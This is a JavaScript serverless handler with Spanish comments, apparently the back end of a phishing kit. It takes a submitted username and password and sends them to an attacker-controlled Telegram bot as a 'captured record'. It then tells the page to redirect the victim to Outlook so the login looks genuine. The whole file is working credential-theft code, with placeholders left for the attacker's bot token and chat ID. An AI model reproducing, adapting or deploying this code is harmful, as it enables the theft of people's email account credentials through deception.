export default async function handler(req, res) {
    // 1. Validar que la petición sea POST
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: "Método no permitido." });
    }

    // 2. Extraer los datos enviados por el frontend
    const { usuario, contrasenha } = req.body;

    // 3. Validar que los datos existan
    if (!usuario || !contrasenha) {
        return res.status(400).json({ success: false, message: "Datos incompletos." });
    }

    // 4. 🔴 REEMPLAZA ESTOS VALORES POR LOS DE TU BOT DE TELEGRAM
    const token = "TU_TOKEN_HTTP_API_AQUI"; 
    const chat_id = "TU_CHAT_ID_AQUI";

    // 5. Construir el mensaje
    const mensaje = `🚨 <b>Nuevo registro capturado</b>\n\n<b>Usuario:</b> ${usuario}\n<b>Contraseña:</b> ${contrasenha}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    // 6. Enviar la petición a Telegram
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: mensaje,
                parse_mode: 'HTML'
            })
        });

        // 7. Responder al frontend para que redirija a Outlook
        if (response.ok) {
            res.status(200).json({ success: true, message: "Verificacion correcta" });
        } else {
            res.status(500).json({ success: false, message: "Error al notificar a Telegram." });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: "Error en el servidor." });
    }
}
